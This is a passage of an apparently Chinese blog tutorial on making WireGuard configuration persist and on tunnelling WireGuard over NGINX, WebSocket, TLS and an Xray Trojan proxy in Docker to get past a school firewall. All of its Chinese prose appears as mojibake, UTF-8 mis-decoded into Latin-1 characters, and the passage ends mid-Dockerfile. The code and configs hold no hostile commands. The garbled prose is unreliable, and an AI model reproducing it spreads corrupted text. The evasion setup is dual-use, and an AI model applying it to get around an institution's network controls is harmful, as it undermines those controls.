class="language-bash">sudo wg <span class="hljs-built_in">set</span> wg0 peer å®¢æˆ·ç«¯ç”Ÿäº§çš„å…¬é’¥ allowed-ips è‡ªå®šä¹‰çš„å†…ç½‘åœ°å€</span><br></code></pre></td></tr></table></figure><p>ä¸è¿‡è¯¥é…ç½®ä¸ä¼šè¢«æŒä¹…åŒ–åˆ°æ–‡ä»¶ä¸­ï¼Œè€Œä»…ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œè¿™æ„å‘³ç€ä¸‹æ¬¡é‡æ–°å¯åŠ¨å°±æ¶ˆå¤±äº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é¢å¤–çš„é…ç½®æ¥å°†å…¶æŒä¹…åŒ–</p><h2 id="æŒä¹…åŒ–å½“å‰é…ç½®"><a href="#æŒä¹…åŒ–å½“å‰é…ç½®" class="headerlink" title="æŒä¹…åŒ–å½“å‰é…ç½®"></a>æŒä¹…åŒ–å½“å‰é…ç½®</h2><p>æˆ‘ä»¬å·²çŸ¥å¦‚ä¸‹å‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰é…ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg showconf wg0</span><br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨å…³é—­ WireGuard æ—¶å°†å½“å‰é…ç½®æŒä¹…åŒ–åˆ°æ–‡ä»¶å½“ä¸­ï¼Œç¼–å†™è„šæœ¬ <code>/etc/wireguard/wg0.down.sh</code> å¦‚ä¸‹ï¼ˆåˆ«å¿˜äº† <code>chmod +x</code> æ·»åŠ æƒé™ï¼‰ï¼š</p><blockquote><p>ä»¥åŠæŠŠä¹‹å‰çš„ iptables ä¹Ÿæ¬åˆ°è¿™ä¸ªè„šæœ¬é‡Œï¼Œæ–¹ä¾¿ç®¡ç†</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># Save current config, note that we should remove `Endpoint` as it&#x27;s usually dynamic</span><br>wg showconf wg0 | grep -v <span class="hljs-string">&#x27;^\s*Endpoint\s*=&#x27;</span> | <span class="hljs-built_in">tee</span> /etc/wireguard/wg0.autoconf<br><br><span class="hljs-comment"># Delete iptables rules</span><br>iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o ä½ çš„å…¬ç½‘ç½‘å¡å -j MASQUERADE<br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬åœ¨å¯åŠ¨ WireGuard æ—¶å°†è¯¥é…ç½®åŠ è½½è¿›æ¥ï¼Œç¼–å†™è„šæœ¬ <code>/etc/wireguard/wg0.up.sh</code> å¦‚ä¸‹ï¼š</p><blockquote><p>ä»¥åŠæŠŠä¹‹å‰çš„ iptables ä¹Ÿæ¬åˆ°è¿™ä¸ªè„šæœ¬é‡Œï¼Œæ–¹ä¾¿ç®¡ç†</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># Load previous config</span><br>wg setconf wg0 /etc/wireguard/wg0.autoconf<br><br><span class="hljs-comment"># Add iptables rules</span><br>iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ä½ çš„å…¬ç½‘ç½‘å¡å -j MASQUERADE<br></code></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹ <code>/etc/wireguard/wg0.conf</code> å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = ç§é’¥æ–‡ä»¶å†…å®¹<br><span class="hljs-attr">ListenPort</span> = è‡ªå®šä¹‰çš„ç›‘å¬ç«¯å£<br><span class="hljs-attr">Address</span> = è‡ªå®šä¹‰çš„å†…ç½‘åœ°å€ï¼Œä¾‹å¦‚ <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PostUp</span>   = /etc/wireguard/wg0.up.sh<br><span class="hljs-attr">PreDown</span> = /etc/wireguard/wg0.down.sh<br></code></pre></td></tr></table></figure><h1 id="0x04-åˆ©ç”¨-NGINX-åä»£-WireGuard-Over-Trojan"><a href="#0x04-åˆ©ç”¨-NGINX-åä»£-WireGuard-Over-Trojan" class="headerlink" title="0x04. åˆ©ç”¨ NGINX åä»£ WireGuard Over Trojan"></a>0x04. åˆ©ç”¨ NGINX åä»£ WireGuard Over Trojan</h1><blockquote><p>æ³¨ï¼šè¿™ä¼šè®©é€Ÿåº¦å¤§å¹…ä¸‹é™â•å»¶è¿Ÿå¤§å¹…æé«˜ï¼ˆæ¯•ç«Ÿå¤šäº†å¥½å‡ å±‚ä¼ è¾“å’ŒåŠ è§£å¯†çš„å·¥ä½œï¼‰ï¼Œå› æ­¤é™¤é Wireguard ç›´è¿æ— æ³•å®Œæˆé…ç½®ï¼Œå¦åˆ™ç¬”è€… <em>å…¶å®ä¸å¤ªæ¨èæ­å»ºè¿™æ ·çš„æ¶æ„</em> </p></blockquote><p>ä¼—æ‰€å‘¨çŸ¥éšç€å›½é™…ç½‘ç»œå±€åŠ¿ä¸æ–­å˜åŒ–ï¼Œå‰é¢å¿˜äº†ä¸­é—´å¿˜äº†åé¢ä¹Ÿå¿˜äº†ï¼Œæ€»è€Œè¨€ä¹‹å°±æ˜¯ WireGuard ç›´æ¥ç»„ç½‘å› ä¸ºå„ç§ç›´æ¥æˆ–é—´æ¥çš„å› ç´ è€Œå­˜åœ¨ä¸€å®šçš„å°é—®é¢˜å¯¼è‡´æ— æ³•è¿æ¥æˆåŠŸï¼Œä¾‹å¦‚ç¬”è€…å­¦æ ¡çš„é˜²ç«å¢™å°±è¿‡æ»¤æ‰äº† WireGuard æµé‡ï¼ˆä¹Ÿæœ‰å¯èƒ½æ˜¯ UDP éƒ½è¿‡æ»¤äº†ï¼Œæ€»è€Œè¨€ä¹‹è¿™å¯¼è‡´ç¬”è€…ä¸èƒ½ç”¨ tailscale è¿æ¥å­¦æ ¡æœåŠ¡å™¨å¾ˆéš¾å—ï¼‰ï¼Œå› æ­¤éœ€è¦ä¸ºæˆ‘ä»¬çš„ WireGuard éš§é“å¥—ä¸€äº›é˜²æŠ¤</p><p>åŸºäº UDP çš„ WireGuard åè®®å®¹æ˜“è¢«å„ç§é¢„æœŸå¤–çš„ç‰©ç†å› ç´ è¯†åˆ«ä¸é˜»æ–­ï¼Œå› æ­¤æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥å†å¥—å‡ å±‚åè®®ä»¥æé«˜å…¶è¿æ¥ç¨³å®šæ€§ï¼Œåœ¨ <a href="https://arttnba3.cn/2024/08/31/OPS-0X02-AUSTRALIA_FIREWALL_ESCAPE/">å¦‚ä½•åœ¨æ¾³æ´²æ ¡å›­ç½‘ç©åŸç¥</a> è¿™ä¸€ç¯‡åšå®¢ä¸­ç¬”è€…ç®€è¦å™è¿°äº†ä½¿ç”¨ NGINX + Websocket + TLS + Trojan çš„ä»£ç†æ–¹æ¡ˆï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬åŒæ ·å¯ä»¥åˆ©ç”¨ç±»ä¼¼çš„æ¶æ„è½¬å‘ Wireguard æµé‡å®Œæˆç»„ç½‘</p><p><img src="https://s2.loli.net/2024/11/08/Ym5e8gaBD6RduEy.png" alt="éšæ‰‹ç”»äº†ä¸ªå›¾ï¼Œå¯èƒ½æœ‰ç‚¹éš¾çœ‹ï¼Œä¸è¿‡å¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€"></p><blockquote><p>æ³¨ï¼šä¼¼ä¹ WireGuard åœ¨è¿™ä¸ªæ¶æ„å½“ä¸­æ˜¯å¤šä½™çš„ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ Xray ç»„ç½‘ï¼Ÿ</p></blockquote><h2 id="å…¬ç½‘æœåŠ¡å™¨é…ç½®"><a href="#å…¬ç½‘æœåŠ¡å™¨é…ç½®" class="headerlink" title="å…¬ç½‘æœåŠ¡å™¨é…ç½®"></a>å…¬ç½‘æœåŠ¡å™¨é…ç½®</h2><blockquote><p>æ³¨ï¼šå¯ä»¥é€šè¿‡ CloudFlare CDN ä»£ç†éšè—å…¬ç½‘æœåŠ¡å™¨çœŸå® IPï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯åœ¨éƒ¨åˆ†ç½‘ç»œçº¿è·¯ä¸‹ CloudFlare çš„éƒ¨åˆ†ç½‘æ®µæ˜¯è¢«å±è”½çš„ï¼Œä»è€Œå¯¼è‡´å¯ç”¨æ€§ä¸‹é™</p></blockquote><h3 id="1ï¸âƒ£-é…ç½®-WireGuard"><a href="#1ï¸âƒ£-é…ç½®-WireGuard" class="headerlink" title="1ï¸âƒ£ é…ç½® WireGuard"></a>1ï¸âƒ£ é…ç½® WireGuard</h3><p>å’Œå‰é¢çš„æµç¨‹åŸºæœ¬ä¸€æ ·ï¼Œè¿™é‡Œä¸å†èµ˜å™</p><h3 id="2ï¸âƒ£-é…ç½®-NGINX-åå‘ä»£ç†"><a href="#2ï¸âƒ£-é…ç½®-NGINX-åå‘ä»£ç†" class="headerlink" title="2ï¸âƒ£ é…ç½® NGINX åå‘ä»£ç†"></a>2ï¸âƒ£ é…ç½® NGINX åå‘ä»£ç†</h3><p>é¦–å…ˆæ˜¯å®‰è£…ä¸å¯ç”¨ NGINXï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y nginx</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now nginx.service</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åœ¨ <code>/etc/nginx/conf.d</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„é…ç½®æ–‡ä»¶ <code>è‡ªå·±æƒ³åå­—.conf</code> ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> ä½ çš„åŸŸå;<br><br>        <span class="hljs-attribute">ssl_protocols</span>   TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br>        <span class="hljs-attribute">ssl_certificate</span>     ä½ çš„ .pem è¯ä¹¦è·¯å¾„;<br>        <span class="hljs-attribute">ssl_certificate_key</span> ä½ çš„ .key å¯†é’¥è·¯å¾„;<br>        <span class="hljs-attribute">ssl_session_cache</span>       shared:SSL:<span class="hljs-number">10m</span>;<br>        <span class="hljs-attribute">ssl_session_timeout</span>     <span class="hljs-number">10m</span>;<br><br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> /srv/www/ä½ çš„è‡ªå®šä¹‰ç½‘é¡µè·¯å¾„;<br>                <span class="hljs-attribute">index</span> index.html;<br>        &#125;<br><br>        <span class="hljs-section">location</span> /å’Œxrayé…ç½®ç›¸åŒçš„ä½ çš„è‡ªå®šä¹‰è·¯å¾„ &#123;<br>                <span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_upgrade</span> != <span class="hljs-string">&quot;websocket&quot;</span>) &#123;<br>                        <span class="hljs-attribute">return</span> <span class="hljs-number">400</span>;<br>                &#125;<br>                <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:å’Œxrayé…ç½®ç›¸åŒçš„ä½ çš„è‡ªå®šä¹‰æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œä¾‹å¦‚11451;<br>                <span class="hljs-attribute">proxy_intercept_errors</span> <span class="hljs-literal">on</span>;<br>                <span class="hljs-attribute">error_page</span> <span class="hljs-number">400</span> = https://ä½ è‡ªå·±çš„åŸŸå/;<br><br>                <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">&quot;upgrade&quot;</span>;<br>                <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">600s</span>;<br><br>                <span class="hljs-attribute">proxy_set_header</span> X-Read-IP <span class="hljs-variable">$remote_addr</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åé‡å¯ NGINXï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><h3 id="3ï¸âƒ£-é…ç½®-XRAY-Trojan-ä»£ç†"><a href="#3ï¸âƒ£-é…ç½®-XRAY-Trojan-ä»£ç†" class="headerlink" title="3ï¸âƒ£ é…ç½® XRAY Trojan ä»£ç†"></a>3ï¸âƒ£ é…ç½® XRAY Trojan ä»£ç†</h3><p>ç›´æ¥ä¸Š Dockerï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v24.11.5/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">11451</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ <code>config.json</code> è¿™ä¹ˆå†™ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„æ—¥å¿—åœ°å€ï¼Œä¾‹å¦‚/var/log/xray/error.log&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„æ—¥å¿—åœ°å€ï¼Œä¾‹å¦‚/var/log/xray/access.log&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> ä½ çš„è‡ªå®šä¹‰çš„xrayæœ¬åœ°ç›‘å¬ç«¯å£ï¼Œä¾‹å¦‚<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ è‡ªå·±æƒ³ä¸€ä¸ªå¯†ç &quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/è‡ªå·±è®¾å®šçš„è·¯å¾„&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;rules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;bittorrent&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;sendThrough&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;redirect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:WireGuardçš„æœ¬åœ°ç›‘å¬ç«¯å£&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ„å»ºè¿è¡Œï¼Œè¿™é‡Œç›´æ¥è®©å®¹å™¨ä½¿ç”¨æœ¬åœ°ç½‘ç»œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t wg-xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=wg-xray --network=host wg-xray</span><br></code></pre></td></tr></table></figure><h2 id="å†…ç½‘å®¢æˆ·ç«¯é…ç½®"><a href="#å†…ç½‘å®¢æˆ·ç«¯é…ç½®" class="headerlink" title="å†…ç½‘å®¢æˆ·ç«¯é…ç½®"></a>å†…ç½‘å®¢æˆ·ç«¯é…ç½®</h2><h3 id="1ï¸âƒ£-é…ç½®-WireGuard-1"><a href="#1ï¸âƒ£-é…ç½®-WireGuard-1" class="headerlink" title="1ï¸âƒ£ é…ç½® WireGuard"></a>1ï¸âƒ£ é…ç½® WireGuard</h3><p>å’Œå‰é¢åŸºæœ¬ä¸€è‡´ï¼Œå…¶ä»–ä¸å†èµ˜å™ï¼Œä¸è¿‡é…ç½®æ–‡ä»¶ä¿®æ”¹å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = å®¢æˆ·ç«¯ç”Ÿæˆçš„ç§é’¥<br><span class="hljs-attr">Address</span> = ä¸Šé¢é…ç½®çš„å®¢æˆ·ç«¯åœ°å€<br><span class="hljs-attr">MTU</span> = <span class="hljs-number">1280</span><br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = æœåŠ¡ç«¯çš„å…¬é’¥<br><span class="hljs-attr">Endpoint</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:xrayç›‘å¬çš„æœ¬åœ°ç«¯å£<br><span class="hljs-attr">AllowedIPs</span> = æœåŠ¡ç«¯ç½‘æ®µï¼Œä¾‹å¦‚ <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h3 id="2ï¸âƒ£-é…ç½®-xray"><a href="#2ï¸âƒ£-é…ç½®-xray" class="headerlink" title="2ï¸âƒ£ é…ç½® xray"></a>2ï¸âƒ£ é…ç½® xray</h3><p>ç›´æ¥ä¸Š Dockerï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v24.11.5/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span 